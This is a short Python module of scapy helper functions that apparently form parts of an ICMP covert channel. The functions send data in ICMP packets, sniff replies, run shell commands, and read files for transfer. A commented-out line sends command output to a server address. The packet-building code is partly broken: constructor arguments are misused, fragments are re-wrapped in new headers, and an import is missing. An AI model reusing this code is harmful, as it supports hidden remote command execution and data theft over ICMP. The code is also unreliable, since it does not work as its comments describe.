import os
from scapy.all import *
import signal
import subprocess


from scapy.all import *
import threading


def pkt_send(dest,data,icmp_type):
    pkt = IP(dest)/ICMP(icmp_type)/data
    try:
        frags=fragment(pkt,fragsize=1400)    # divide the packet into fragments if it's over 1400 bytes
        for frg in frags:                    # by default, the router might send packets over 1500 bytes, which the computer cannot send forward
            send(IP(dst=dest)/ICMP(type=icmp_type)/frg)                            # send each fragment independently
    except:
           print("failed to send in frags")

def sniff_pkt(pfilter,handler,cnt=30,timer=1000):
    capture = sniff(filter=pfilter,count=cnt,prn=handler,timeout=timer)
    
def signal_handler(sig, frame):
    print(' Exiting...')
    sys.exit(0)
    
def extract_data(packet):
    try:
        return packet[0][Raw].load.decode('utf-8')
    except:
        return str(None)
    
def RunCommand(cmd):
    return subprocess.getoutput(cmd)
    # output_stream = os.popen(cmd)
    # pkt_send(dest=server_adr,data=output_stream.read())
    
    
def read_file(file_name):
    file = open(file_name, 'r')
    data = "file! " + file_name + ' ' +file.read()
    return data



    
    
    